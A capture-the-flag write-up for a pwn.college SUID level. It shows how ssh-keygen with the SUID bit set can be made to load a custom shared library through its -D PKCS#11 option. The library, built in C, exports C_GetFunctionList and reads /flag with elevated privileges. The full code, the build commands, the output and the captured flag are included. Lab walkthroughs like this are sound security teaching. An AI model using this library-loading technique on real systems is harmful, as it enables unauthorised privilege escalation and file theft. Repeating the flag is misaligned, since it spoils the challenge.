`ssh-keygen`

`ssh-keygen` is a command line program that is used to generate SSH key pairs which are used for secure communication between two machine such as connecting to a remote server securely.

For this problem, these statements are very important.

```bash
Desktop  demo  key  key.pub
hacker@program-misuse-level-51:~$ /challenge/babysuid_level51 
Welcome to /challenge/babysuid_level51!

This challenge is part of a series of programs that
show you how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part!).

I just set the SUID bit on /usr/bin/ssh-keygen.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level51) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/ssh-keygen!
```

Here I think the problem wants us to load our code in the program here the program means `ssh-keygen`. 

What is the benefit of loading our code? There can be some way to open the `flag` file in the code. 

Now we have to find that how `ssh-keygen` can take a code. We have to run `man ssh-keygen`. 

After searching in the `man ssh-keygen` we can see that there is this:

`-D pkcs11` that can load a library called `pkcs11`. Sounds interesting. And the library is called `shared library` that means it is a `dynamic Link library`. 

Now make a `C` code and make it a `dynamic link library`. `dll` are the libraries that are loaded in the runtime of the program execution. Opposite is the `static library`.

```C
#include<stdio.h>
int main()
{
printf("Hello World\n");
return 0;
}
```

Now we will make this code a `shared library`. You can google it how to make a `dynamic Link Library`.

```bash
hacker@program-misuse-level-51:~$ touch test.c
hacker@program-misuse-level-51:~$ gcc -c -fPIC test.c -o test.o
hacker@program-misuse-level-51:~$ ls
Desktop  demo  key  key.pub  test.c  test.o
hacker@program-misuse-level-51:~$ gcc -shared test.o -o test.so
hacker@program-misuse-level-51:~$ ls
Desktop  demo  key  key.pub  test.c  test.o  test.so
hacker@program-misuse-level-51:~$ ssh-keygen -D ./test.so 
./test.so does not contain expected string C_GetFunctionList
provider ./test.so is not a PKCS11 library
cannot read public key from pkcs11
```

But here we can see it says it expects `C_GetFunctionList` in the `test.so` file.

Let's change the `main` to `C_GetFunctionList` in our source code.

```C
#include<stdio.h>
int C_GetFunctionList()
{
printf("Hello World\n");
return 0;
}
```

```bash
hacker@program-misuse-level-51:~$ gcc -c -fPIC test.c -o test.o
hacker@program-misuse-level-51:~$ gcc -shared test.o -o test.so
hacker@program-misuse-level-51:~$ ssh-keygen -D ./test.so 
Hello World
Segmentation fault
```

Ah!, our code runs. Now let's open the `flag` file and read its content.

```C
#include<stdio.h>

int C_GetFunctionList()
{
printf("Hello World\n");

FILE* fp;
fp = fopen("/flag", "r");

char line[100];

while(fgets(line, 100, fp))
{
   printf("%s", line);
}
return 0;
}
```

```bash
hacker@program-misuse-level-51:~$ gcc -c -fPIC test.c -o test.o
hacker@program-misuse-level-51:~$ gcc -shared test.o -o test.so
hacker@program-misuse-level-51:~$ ssh-keygen -D ./test.so 
Hello World
pwn.college{wdEdAguJMXoLfF3EBlmcTNLOPDt.01M5EDL0AjNzQzW}
Segmentation fault
```

Here is the flag.


